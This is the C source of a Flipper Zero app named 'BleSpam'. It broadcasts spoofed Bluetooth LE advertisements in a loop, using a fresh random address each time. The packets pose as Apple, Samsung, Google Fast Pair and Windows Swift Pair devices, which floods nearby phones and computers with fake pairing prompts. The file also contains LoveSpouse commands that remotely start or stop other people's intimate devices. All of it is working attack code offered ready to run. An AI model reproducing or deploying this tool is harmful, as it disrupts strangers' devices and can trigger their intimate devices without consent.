#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <gui/gui.h>
#include <gui/view.h>
#include <gui/view_dispatcher.h>
#include <gui/elements.h>
#include <stdlib.h>
#include <string.h>

#include "esp_boost.h"

#define TAG "BleSpam"

// --- Device types ---
typedef enum {
    TypeApplePair,
    TypeAppleAction,
    TypeSamsung,
    TypeSamsungWatch,
    TypeAndroid,
    TypeWindows,
    TypeLovePlay,
    TypeLoveStop,
    TypeRotate,
} DevType;

typedef struct {
    const char* name;
    DevType type;
    uint8_t data[31];
    uint8_t len;
} DevEntry;

// Apple Proximity Pair base: len, type=0xFF, company=0x004C, subtype=0x07, len=0x19, status=0x01
// Then model (2B), status, battery(3B), lid, color, filler
#define APPLE_PAIR(n, m0, m1) \
    {n, TypeApplePair, {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, m0, m1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 31}

// Apple Nearby Action base: len, type=0xFF, company=0x004C, subtype=0x0F, len, flags, action_type
#define APPLE_ACTION(n, flags, act) \
    {n, TypeAppleAction, {0x10, 0xFF, 0x4C, 0x00, 0x0F, 0x05, flags, act, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 17}

// Samsung EasySetup Buds
#define SAMSUNG_BUDS(n, d0, d1) \
    {n, TypeSamsung, {0x15, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, d0, d1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 22}

// Samsung EasySetup Watch
#define SAMSUNG_WATCH(n, d0, d1) \
    {n, TypeSamsungWatch, {0x15, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, d0, d1, 0x00, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 22}

static const DevEntry devs[] = {
    // Apple Proximity Pair (models from binary)
    APPLE_PAIR("AirPods",           0x20, 0x02),
    APPLE_PAIR("AirPods 2",        0x0F, 0x20),
    APPLE_PAIR("AirPods 3",        0x13, 0x21),
    APPLE_PAIR("AirPods Pro",      0x0E, 0x20),
    APPLE_PAIR("AirPods Pro 2",    0x14, 0x20),
    APPLE_PAIR("AirPods Max",      0x0A, 0x20),
    APPLE_PAIR("Beats Flex",       0x10, 0x20),
    APPLE_PAIR("Beats Studio Buds",0x12, 0x20),
    APPLE_PAIR("Beats Studio Buds+",0x16,0x20),
    APPLE_PAIR("Beats Solo 3",     0x06, 0x20),
    APPLE_PAIR("Beats Studio 3",   0x09, 0x20),
    APPLE_PAIR("Beats Fit Pro",    0x10, 0x21),
    APPLE_PAIR("Beats X",          0x05, 0x20),
    APPLE_PAIR("Powerbeats 3",     0x03, 0x20),
    APPLE_PAIR("Powerbeats Pro",   0x0B, 0x20),
    APPLE_PAIR("AirTag",           0x05, 0x30),
    APPLE_PAIR("Hermes AirTag",    0x05, 0x31),
    APPLE_PAIR("Apple Vision Pro", 0x24, 0x02),

    // Apple Nearby Actions
    APPLE_ACTION("AppleTV Pair",        0xC0, 0x04),
    APPLE_ACTION("Join AppleTV?",       0xBF, 0x06),
    APPLE_ACTION("HomePod Setup",       0xC0, 0x01),
    APPLE_ACTION("Transfer Number",     0xC0, 0x05),
    APPLE_ACTION("AppleTV Connect..",   0xC0, 0x07),
    APPLE_ACTION("AppleTV ColorBal",    0xC0, 0x08),
    APPLE_ACTION("AppleID",             0xC0, 0x09),
    APPLE_ACTION("AppleTV?",            0xC0, 0x02),
    APPLE_ACTION("Sign In Device",      0xC0, 0x0B),
    APPLE_ACTION("HomeKit",             0xC0, 0x0D),
    APPLE_ACTION("AppleTV",             0xC0, 0x0E),

    // Samsung Buds
    SAMSUNG_BUDS("Samsung Buds Pro",    0x01, 0xEE),
    SAMSUNG_BUDS("Samsung Buds 2",      0x01, 0xF0),
    SAMSUNG_BUDS("Samsung Buds Live",   0x01, 0xEF),
    SAMSUNG_BUDS("Samsung Buds FE",     0x01, 0xF3),
    SAMSUNG_BUDS("Samsung Buds2 Purp",  0x01, 0xF5),

    // Samsung Watch
    SAMSUNG_WATCH("Samsung Watch4 44",  0x11, 0xA5),
    SAMSUNG_WATCH("Samsung Watch5 44",  0x11, 0xA7),
    SAMSUNG_WATCH("Samsung Watch6 40",  0x11, 0xB0),
    SAMSUNG_WATCH("Samsung Watch Ultra",0x11, 0xAA),

    // Google Fast Pair
    {"Android Fast Pair", TypeAndroid, {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 7},

    // Windows Swift Pair
    {"Windows Swift Pair", TypeWindows, {0x07, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8},

    // LoveSpouse
    {"LoveSpouse Play", TypeLovePlay, {0x08, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 9},
    {"LoveSpouse Stop", TypeLoveStop, {0x08, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 9},

    // Rotate all
    {"[ALL] Rotate", TypeRotate, {0}, 0},
};

#define DEV_COUNT (sizeof(devs) / sizeof(devs[0]))

typedef struct {
    int sel;
    bool broadcasting;
    bool ble_ok;
    bool esp_connected;
} BleSpamModel;

typedef struct {
    ViewDispatcher* vd;
    View* view;
    FuriThread* worker;
    bool running;
    int sel;
    EspBoost* esp;
} BleSpamApp;

// --- Packet building ---
static void build_packet(uint8_t* out, uint8_t* out_len, const DevEntry* dev) {
    memcpy(out, dev->data, dev->len);
    *out_len = dev->len;

    switch(dev->type) {
    case TypeApplePair:
        // Randomize battery bytes (rand()%16 for Beats compatibility)
        out[9] = (rand() % 16) | 0x40;   // right
        out[10] = (rand() % 16) | 0x40;  // left
        out[11] = (rand() % 16) | 0x40;  // case
        break;
    case TypeAppleAction:
        // Auth tag random fill
        out[7] = rand() & 0xFF;
        out[8] = rand() & 0xFF;
        out[9] = rand() & 0xFF;
        break;
    case TypeAndroid: {
        // Random model ID from Fast Pair DB
        uint32_t model = rand() & 0xFFFFFF;
        out[3] = (model >> 16) & 0xFF;
        out[4] = (model >> 8) & 0xFF;
        out[5] = model & 0xFF;
        break;
    }
    default:
        break;
    }
}

static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
    switch(type) {
    case TypeApplePair:
    case TypeAppleAction:
        return EspBoostCmdApple;
    case TypeSamsung:
    case TypeSamsungWatch:
        return EspBoostCmdSamsung;
    case TypeAndroid:
        return EspBoostCmdGoogle;
    case TypeWindows:
        return EspBoostCmdWindows;
    case TypeRotate:
        return EspBoostCmdRandom;
    default:
        return EspBoostCmdRandom;
    }
}

// --- BLE worker thread ---
static int32_t worker_fn(void* ctx) {
    BleSpamApp* app = ctx;
    GapExtraBeaconConfig config = {
        .adv_channel_map = GapAdvChannelMap37 | GapAdvChannelMap38 | GapAdvChannelMap39,
        .adv_power_level = GapAdvPowerLevel_0dBm,
        .min_adv_interval_ms = 50,
        .max_adv_interval_ms = 150,
        .address_type = GapAddressTypeRandom,
    };

    int rotate_idx = 0;

    while(app->running) {
        int idx = app->sel;
        // Rotate mode
        if(devs[idx].type == TypeRotate) {
            idx = rotate_idx;
            rotate_idx = (rotate_idx + 1) % (DEV_COUNT - 1); // skip last entry (Rotate itself)
        }

        const DevEntry* dev = &devs[idx];
        uint8_t pkt[31];
        uint8_t pkt_len = 0;
        build_packet(pkt, &pkt_len, dev);

        // Random MAC with top 2 bits = 0xC0 (random address)
        uint8_t mac[6];
        furi_hal_random_fill_buf(mac, 6);
        mac[5] = (mac[5] & 0x3F) | 0xC0;
        memcpy(config.address, mac, 6);

        furi_hal_bt_extra_beacon_stop();
        bool ok = furi_hal_bt_extra_beacon_set_config(&config);
        if(ok) ok = furi_hal_bt_extra_beacon_set_data(pkt, pkt_len);
        if(ok) ok = furi_hal_bt_extra_beacon_start();

        with_view_model(
            app->view,
            BleSpamModel * m,
            { m->ble_ok = ok; },
            true);

        if(ok) {
            furi_hal_light_set(LightBlue, 0xFF);
        } else {
            furi_hal_light_set(LightRed, 0xFF);
        }

        furi_delay_ms(200);
        furi_hal_light_set(LightBlue, 0x00);
        furi_hal_light_set(LightRed, 0x00);
        furi_delay_ms(50);
    }

    furi_hal_bt_extra_beacon_stop();
    return 0;
}

// --- Start / Stop ---
static void do_start(BleSpamApp* app) {
    if(app->running) return;

    furi_hal_bt_stop_advertising();

    app->running = true;
    furi_thread_start(app->worker);

    // ESP32 boost: start parallel broadcast
    if(app->esp) {
        EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
        esp_boost_start(app->esp, cmd);
    }

    with_view_model(
        app->view,
        BleSpamModel * m,
        { m->broadcasting = true; },
        true);
}

static void do_stop(BleSpamApp* app) {
    if(!app->running) return;
    app->running = false;
    furi_thread_join(app->worker);

    furi_hal_bt_extra_beacon_stop();
    furi_hal_bt_start_advertising();

    // ESP32 boost: stop
    if(app->esp) {
        esp_boost_stop(app->esp);
    }

    furi_hal_light_set(LightBlue, 0x00);
    furi_hal_light_set(LightRed, 0x00);

    with_view_model(
        app->view,
        BleSpamModel * m,
        { m->broadcasting = false; },
        true);
}

// --- Draw callback ---
static void draw_cb(Canvas* canvas, void* model) {
    BleSpamModel* m = model;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    // Title
    const char* title = m->esp_connected ? "BleSpam+ESP" : "BleSpam";
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, title);

    // Device name
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str_aligned(canvas, 64, 16, AlignCenter, AlignTop, devs[m->sel].name);

    // Index
    char buf[32];
    snprintf(buf, sizeof(buf), "%d / %d", m->sel + 1, (int)DEV_COUNT);
    canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignTop, buf);

    // Status
    canvas_set_font(canvas, FontPrimary);
    if(m->broadcasting) {
        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Broadcasting");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(
            canvas, 64, 52, AlignCenter, AlignTop, m->ble_ok ? "BLE:OK" : "BLE:ERR");
    } else {
        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Stopped");
    }

    // Buttons
    elements_button_left(canvas, "< Prev");
    elements_button_right(canvas, "Next >");
    if(m->broadcasting) {
        elements_button_center(canvas, "STOP");
    } else {
        elements_button_center(canvas, "START");
    }
}

// --- Input callback ---
static bool input_cb(InputEvent* event, void* ctx) {
    BleSpamApp* app = ctx;
    if(event->type != InputTypeShort && event->type != InputTypeLong) return false;

    if(event->key == InputKeyOk) {
        if(app->running) {
            do_stop(app);
        } else {
            do_start(app);
        }
        return true;
    }

    if(event->key == InputKeyLeft) {
        bool was_running = app->running;
        if(was_running) do_stop(app);
        app->sel = (app->sel - 1 + (int)DEV_COUNT) % (int)DEV_COUNT;
        with_view_model(
            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
        if(was_running) do_start(app);
        return true;
    }

    if(event->key == InputKeyRight) {
        bool was_running = app->running;
        if(was_running) do_stop(app);
        app->sel = (app->sel + 1) % (int)DEV_COUNT;
        with_view_model(
            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
        if(was_running) do_start(app);
        return true;
    }

    if(event->key == InputKeyBack) {
        if(app->running) do_stop(app);
        view_dispatcher_stop(app->vd);
        return true;
    }

    return false;
}

// --- Main entry ---
int32_t x_ble_spam_main(void* p) {
    UNUSED(p);

    BleSpamApp* app = malloc(sizeof(BleSpamApp));
    memset(app, 0, sizeof(BleSpamApp));

    // ESP32 boost init (NULL = not connected, app works fine without it)
    app->esp = esp_boost_init();

    app->vd = view_dispatcher_alloc();
    app->view = view_alloc();
    view_allocate_model(app->view, ViewModelTypeLocking, sizeof(BleSpamModel));
    view_set_draw_callback(app->view, draw_cb);
    view_set_input_callback(app->view, input_cb);
    view_set_context(app->view, app);

    with_view_model(
        app->view,
        BleSpamModel * m,
        {
            m->sel = 0;
            m->broadcasting = false;
            m->ble_ok = false;
            m->esp_connected = esp_boost_is_connected(app->esp);
        },
        true);

    view_dispatcher_add_view(app->vd, 0, app->view);

    Gui* gui = furi_record_open(RECORD_GUI);
    view_dispatcher_attach_to_gui(app->vd, gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(app->vd, 0);

    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "BleSpam");
    furi_thread_set_stack_size(app->worker, 1024);
    furi_thread_set_callback(app->worker, worker_fn);
    furi_thread_set_context(app->worker, app);

    view_dispatcher_run(app->vd);

    // Cleanup
    if(app->running) do_stop(app);

    furi_thread_free(app->worker);
    view_dispatcher_remove_view(app->vd, 0);
    view_free(app->view);
    view_dispatcher_free(app->vd);
    furi_record_close(RECORD_GUI);

    esp_boost_free(app->esp);
    free(app);

    return 0;
}
